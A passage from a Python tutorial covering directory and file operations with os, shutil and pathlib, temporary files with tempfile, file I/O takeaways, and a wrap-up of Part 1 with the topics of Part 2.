os.chdir('/path')  # Change directory
os.listdir('.')  # List directory contents
os.mkdir('newdir')  # Create directory
os.makedirs('path/to/newdir', exist_ok=True)  # Create nested
os.rmdir('emptydir')  # Remove empty directory
os.remove('file.txt')  # Remove file
os.rename('old.txt', 'new.txt')  # Rename

# shutil module (high-level operations)
shutil.copy('src.txt', 'dst.txt')  # Copy file
shutil.copytree('srcdir', 'dstdir')  # Copy directory
shutil.move('src.txt', 'dst.txt')  # Move file
shutil.rmtree('dir')  # Remove directory tree

# ✅ GOOD: pathlib for modern code
p = Path('data')
p.mkdir(exist_ok=True)  # Create directory
p.rmdir()  # Remove empty directory

for item in p.iterdir():  # Iterate directory
    if item.is_file():
        print(item)

# Recursive glob
for py_file in p.rglob('*.py'):
    print(py_file)
```

### Temporary Files

```python
import tempfile

# Temporary file
with tempfile.TemporaryFile() as f:
    f.write(b'data')
    f.seek(0)
    data = f.read()
# File automatically deleted

# Named temporary file
with tempfile.NamedTemporaryFile(delete=False) as f:
    f.write(b'data')
    temp_name = f.name

# Use temp file
with open(temp_name, 'rb') as f:
    data = f.read()

# Clean up
os.unlink(temp_name)

# Temporary directory
with tempfile.TemporaryDirectory() as tmpdir:
    # Use tmpdir
    temp_file = Path(tmpdir) / 'file.txt'
    temp_file.write_text('data')
# Directory and contents deleted
```

### Key Takeaways

**File I/O:**

- **Always use context managers**: `with open()` ensures file closure
- **Specify encoding**: Use `encoding='utf-8'` for text files
- **Binary vs text**: Use `'b'` for non-text files
- **Read large files**: Iterate line by line, don't load all at once
- **pathlib**: Modern, object-oriented path operations
- **Temporary files**: Use `tempfile` for temporary file needs
- **Error handling**: Catch `IOError`/`OSError` for file operations
- **Buffer control**: Flush when needed for real-time writes

---

## Part 1 Complete

Congratulations! You've completed **Part 1: Python Fundamentals & Core Language**. You now have a solid foundation covering:

✅ **Section 1.1**: Introduction to Python
✅ **Section 1.2**: Python Setup & Development Environment
✅ **Section 1.3**: Python Syntax & Basic Constructs
✅ **Section 1.4**: Data Structures
✅ **Section 1.5**: Functions
✅ **Section 1.6**: Object-Oriented Programming
✅ **Section 1.7**: Modules and Packages
✅ **Section 1.8**: Exception Handling
✅ **Section 1.9**: File I/O and Context Managers

**Next Steps:**

Continue with **Part 2: Python Internals & Advanced Language Features** to deepen your understanding of how Python works under the hood.

**Topics in Part 2:**

- CPython Architecture
- Type System & Type Hints
- Iterators and Generators
- Functional Programming
- Asynchronous Programming
- Concurrency & Parallelism
- Metaprogramming

Keep practicing, and happy coding! 🐍
